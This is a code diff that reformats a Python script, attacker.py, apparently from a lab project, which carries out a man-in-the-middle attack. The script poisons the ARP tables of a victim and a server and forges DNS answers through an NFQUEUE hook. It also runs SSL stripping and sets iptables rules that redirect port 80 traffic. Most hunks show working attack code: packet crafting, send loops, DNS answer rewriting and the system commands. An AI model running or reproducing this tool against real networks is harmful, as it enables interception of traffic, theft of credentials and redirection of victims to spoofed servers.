@@ -11,13 +11,13 @@ from sslstrip.CookieCleaner import CookieCleaner
 import logging, os
 import signal
 import threading
-#from  multiprocessing import Process
 import inspect
 
 import sys
 import getopt
 
 stop_flag = False
+
 
 def showUsage():
     print("Usage: attack <options>")
@@ -26,73 +26,77 @@ def showUsage():
     print("-v <ip>     , --ip_victim <ip>             IPv4 Address of the victim")
     print("-s <ip>     , --ip_server <ip>             IPv4 Address of the server")
     print("-d <domain> , --domain_to_spoof <domain>   Domain to spoof")
-    print("-f <ip>     , --ip_to_spoof <ip>           IPv4 Address of the server to spoof")
+    print(
+        "-f <ip>     , --ip_to_spoof <ip>           IPv4 Address of the server to spoof"
+    )
     print("-h          , --help                       Print Usage")
-    print("")	
-    print("Example:"	)
-    print("python attacker.py -i enp0s8 -v 10.0.2.4 -s 10.0.2.1 -d my.org -f 10.0.2.3")	
-    print ("")
+    print("")
+    print("Example:")
+    print("python attacker.py -i enp0s8 -v 10.0.2.4 -s 10.0.2.1 -d my.org -f 10.0.2.3")
+    print("")
+
 
 def parseOptions(argv):
+    global input
 
-	global input
+    network_interface = None
+    ip_victim = None
+    ip_server = None
+    domain_to_spoof = None
+    ip_to_spoof = None
 
-	network_interface = None
-	ip_victim = None
-	ip_server = None
-	domain_to_spoof = None
-	ip_to_spoof = None
-   
-	try:
-		opts, args = getopt.getopt(argv,
-			"i:v:s:d:f:h",
-			[
-			 "interface=",
-			 "ip_victim=", 
-			 "ip_server=",
-			 "domain_to_spoof=",
-			 "ip_to_spoof=",
-			 "help"
+    try:
+        opts, args = getopt.getopt(
+            argv,
+            "i:v:s:d:f:h",
+            [
+                "interface=",
+                "ip_victim=",
+                "ip_server=",
+                "domain_to_spoof=",
+                "ip_to_spoof=",
+                "help",
+            ],
+        )
 
-			]
-			)
+    except getopt.GetoptError:
+        showUsage()
+        sys.exit(2)
 
-	except getopt.GetoptError:
-		showUsage()
-		sys.exit(2)
+    for opt, arg in opts:
+        if opt in ("-i", "--interface"):
+            network_interface = arg
+        if opt in ("-v", "--ip_victim"):
+            ip_victim = arg
+        elif opt in ("-s", "--ip_server"):
+            ip_server = arg
+        elif opt in ("-d", "--domain_to_spoof"):
+            domain_to_spoof = arg
+        elif opt in ("-f", "--ip_to_spoof"):
+            ip_to_spoof = arg
+        elif opt in ("-h", "--help"):
+            showUsage()
+            sys(exit(1))
 
+    # next two lines are needed to work for both python2 and python3
+    try:
+        input = raw_input
+    except NameError:
+        pass
 
-	for opt, arg in opts:
-		if opt in ("-i", "--interface"):
-			network_interface = arg
-		if opt in ("-v", "--ip_victim"):
-			ip_victim = arg
-		elif opt in ("-s", "--ip_server"):
-			ip_server   = arg
-		elif opt in ("-d", "--domain_to_spoof"):
-			domain_to_spoof   = arg
-		elif opt in ("-f", "--ip_to_spoof"):
-			ip_to_spoof   = arg
-		elif opt in ("-h", "--help"):
-			showUsage()
-			sys(exit(1))
+    if network_interface == None:
+        network_interface = input("enter the network interface: ")
+    if ip_victim == None:
+        ip_victim = input("Enter IPv4 Address of the victim: ")
+    if ip_server == None:
+        ip_server = input("Enter IPv4 Address of the server: ")
+    if domain_to_spoof == None:
+        domain_to_spoof = input("Enter domanin.spoof: ")
+    if ip_to_spoof == None:
+        ip_to_spoof = input("Enter IPv4 Address for the DNS spoof: ")
 
-	# next two lines are needed to work for both python2 and python3 
-	try:   input = raw_input
-	except NameError: pass
+    return (network_interface, ip_victim, ip_server, domain_to_spoof, ip_to_spoof)
 
-	if network_interface == None:
-		network_interface = input("enter the network interface: ")
-	if ip_victim == None:
-		ip_victim = input("Enter IPv4 Address of the victim: ")
-	if ip_server == None:
-		ip_server = input("Enter IPv4 Address of the server: ")
-	if domain_to_spoof == None:
-		domain_to_spoof = input("Enter domanin.spoof: ")
-	if ip_to_spoof == None:
-		ip_to_spoof = input("Enter IPv4 Address for the DNS spoof: ")
-
-	return (network_interface, ip_victim, ip_server, domain_to_spoof, ip_to_spoof)
 
 class DefaultTool:
     def __init__(
@@ -110,7 +114,7 @@ class DefaultTool:
         for _, received in result:
             return received[Ether].src
 
-    def inspect(self,packet):
+    def inspect(self, packet):
         # from payload raw packet's to scapy packet
         pkt = IP(packet.get_payload())
         # if the packet is a DNS packet
@@ -126,7 +130,7 @@ class DefaultTool:
         # forward
         packet.accept()
 
-    def spoof(self,pkt):
+    def spoof(self, pkt):
         # change the answer section to redirect domain_to_spoff to desired address
         pkt[DNS].an = DNSRR(
             rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ip_to_spoof
@@ -207,7 +211,7 @@ class DefaultTool:
         victim_arp[ARP].psrc = ip_server
         victim_arp[ARP].hwdst = victim_mac
         victim_arp[ARP].pdst = ip_victim
-        
+
         # Poison the server's ARP table
         server_arp[Ether].src = attacker_mac
         server_arp[ARP].hwsrc = attacker_mac
@@ -219,11 +223,16 @@ class DefaultTool:
         print("poisoning server arp table ...")
 
         while not stop_flag:
-            sendp([victim_arp, server_arp], iface=network_interface, loop = 0, inter = 1, verbose = 0)
+            sendp(
+                [victim_arp, server_arp],
+                iface=network_interface,
+                loop=0,
+                inter=1,
+                verbose=0,
+            )
             time.sleep(1)
 
     def attack(self):
-        
         # we need an iptables FORWARD rule
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
@@ -236,7 +245,7 @@ class DefaultTool:
 
             print("running ssl stripping")
             self.ssl_stripping()
-        
+
         except KeyboardInterrupt:
             # we need to clean the iptables rules else, shen done, we will stop forwarding
             os.system("iptables --flush")
@@ -251,13 +260,18 @@ class DefaultTool:
         t1.join()
         t2.join()
         print("Stopping...")
-        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system(
+            "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+        )
 
     def run_attack(self):
-        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system(
+            "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+        )
         t1 = threading.Thread(target=self.arp_poisoning)
         t1.start()
         t1.join()
+
 
 def signal_handler(signal, frame):
     # Set the stop flag to True when Ctrl+C is pressed
@@ -265,24 +279,34 @@ def signal_handler(signal, frame):
     stop_flag = True
     print("CTRL-C pressed ...")
 
+
 if __name__ == "__main__":
-	
-    (network_interface, ip_victim, ip_server, domain_to_spoof, ip_to_spoof) = parseOptions(sys.argv[1:])
-	
-    print("Interface       = %s"   %(network_interface))
-    print("IP of Victim    = %s"   %(ip_victim))
-    print("IP of Server    = %s"   %(ip_server))
-    print("Domain to spoof = %s"   %(domain_to_spoof))
-    print("IP to spoof     = %s"   %(ip_to_spoof))
+    (
+        network_interface,
+        ip_victim,
+        ip_server,
+        domain_to_spoof,
+        ip_to_spoof,
+    ) = parseOptions(sys.argv[1:])
+
+    print("Interface       = %s" % (network_interface))
+    print("IP of Victim    = %s" % (ip_victim))
+    print("IP of Server    = %s" % (ip_server))
+    print("Domain to spoof = %s" % (domain_to_spoof))
+    print("IP to spoof     = %s" % (ip_to_spoof))
 
     tool = DefaultTool(
         ip_victim, ip_server, domain_to_spoof, network_interface, ip_to_spoof
     )
 
-    #tool.run_attack()
+    # tool.run_attack()
 
-    print("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+    print(
+        "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+    )
+    os.system(
+        "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+    )
     print("iptables -I FORWARD -j NFQUEUE --queue-num 0")
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
@@ -307,16 +331,18 @@ if __name__ == "__main__":
 
     while not stop_flag:
         pass
-    
+
     # Join the threads to wait for it to finish
     reactor.stop()
     t1.join()
     t2.join()
-    
+
     print("Restoring iptables ... ")
-    print("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")    
-    os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+    print(
+        "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+    )
+    os.system(
+        "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+    )
     print("iptables --flush")
     os.system("iptables --flush")
-
-
